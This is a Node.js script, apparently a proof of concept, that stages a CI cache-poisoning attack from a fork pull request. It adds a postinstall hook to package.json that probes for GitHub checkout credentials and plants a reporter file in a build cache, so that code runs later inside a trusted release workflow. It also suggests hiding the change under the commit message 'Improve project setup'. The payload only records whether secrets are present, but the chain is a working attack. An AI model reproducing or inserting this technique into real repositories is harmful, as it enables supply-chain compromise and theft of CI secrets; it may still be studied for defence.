import { mkdir, readFile, writeFile } from "node:fs/promises";
import { join } from "node:path";

const packageJsonPath = "package.json";
const packageJson = JSON.parse(await readFile(packageJsonPath, "utf8"));
packageJson.scripts = {
  ...(packageJson.scripts ?? {}),
  postinstall: "node scripts/attacker-postinstall.mjs"
};

const cachedReporter = `import { appendFileSync, mkdirSync, writeFileSync } from "node:fs";
import { join } from "node:path";

const proofDir = process.env.POC_PROOF_DIR || ".poc-proof";
mkdirSync(proofDir, { recursive: true });

const proof = {
  message: "Cached reporter executed inside trusted release workflow.",
  eventName: process.env.GITHUB_EVENT_NAME || "",
  repository: process.env.GITHUB_REPOSITORY || "",
  ref: process.env.GITHUB_REF || "",
  sha: process.env.GITHUB_SHA || "",
  fakeSecretPresent: Boolean(process.env.POC_FAKE_SECRET),
  fakeSecretLength: process.env.POC_FAKE_SECRET?.length || 0,
  releaseReportingTokenPresent: Boolean(process.env.RELEASE_REPORTING_TOKEN),
  note: "This POC does not print or exfiltrate secret values."
};

writeFileSync(join(proofDir, "release-proof.json"), JSON.stringify(proof, null, 2) + "\\n");
appendFileSync(process.env.GITHUB_STEP_SUMMARY || join(proofDir, "summary.md"), [
  "## Cached reporter executed",
  "",
  "~~~json",
  JSON.stringify(proof, null, 2),
  "~~~",
  ""
].join("\\n"));

console.log("[cached reporter] executed");
console.log("[cached reporter] event=" + proof.eventName);
console.log("[cached reporter] fake secret present=" + proof.fakeSecretPresent);
`;

const postinstall = `import { execFileSync } from "node:child_process";
import { appendFileSync, mkdirSync, writeFileSync } from "node:fs";
import { join } from "node:path";

const proofDir = process.env.POC_PROOF_DIR || ".poc-proof";
const cacheDir = ".ci-cache";
mkdirSync(proofDir, { recursive: true });
mkdirSync(cacheDir, { recursive: true });

function gitExtraHeaderPresent() {
  try {
    const value = execFileSync("git", ["config", "--get-all", "http.https://github.com/.extraheader"], {
      encoding: "utf8",
      stdio: ["ignore", "pipe", "ignore"]
    }).trim();
    return Boolean(value);
  } catch {
    return false;
  }
}

writeFileSync(join(cacheDir, "reporter.mjs"), ${JSON.stringify(cachedReporter)});

const proof = {
  message: "PR postinstall executed and wrote a cached reporter.",
  eventName: process.env.GITHUB_EVENT_NAME || "",
  repository: process.env.GITHUB_REPOSITORY || "",
  ref: process.env.GITHUB_REF || "",
  sha: process.env.GITHUB_SHA || "",
  fakeSecretPresentDuringInstall: Boolean(process.env.POC_FAKE_SECRET),
  fakeSecretLengthDuringInstall: process.env.POC_FAKE_SECRET?.length || 0,
  checkoutGitCredentialsPresent: gitExtraHeaderPresent(),
  cachedReporterWritten: true,
  cachePath: ".ci-cache/reporter.mjs",
  note: "The install step does not need the fake secret. The payload writes state for a later trusted workflow."
};

writeFileSync(join(proofDir, "proof.json"), JSON.stringify(proof, null, 2) + "\\n");
appendFileSync(process.env.GITHUB_STEP_SUMMARY || join(proofDir, "summary.md"), [
  "## PR install hook executed",
  "",
  "~~~json",
  JSON.stringify(proof, null, 2),
  "~~~",
  ""
].join("\\n"));

console.log("[pr postinstall] executed");
console.log("[pr postinstall] event=" + proof.eventName);
console.log("[pr postinstall] fake secret present during install=" + proof.fakeSecretPresentDuringInstall);
console.log("[pr postinstall] cached reporter written=" + proof.cachedReporterWritten);
console.log("[pr postinstall] proof file=" + join(proofDir, "proof.json"));
`;

await writeFile(packageJsonPath, `${JSON.stringify(packageJson, null, 2)}\n`);
await mkdir("scripts", { recursive: true });
await writeFile(join("scripts", "attacker-postinstall.mjs"), postinstall);

console.log("Fork payload written.");
console.log("Next:");
console.log("  git add package.json scripts/attacker-postinstall.mjs");
console.log('  git commit -m "Improve project setup"');
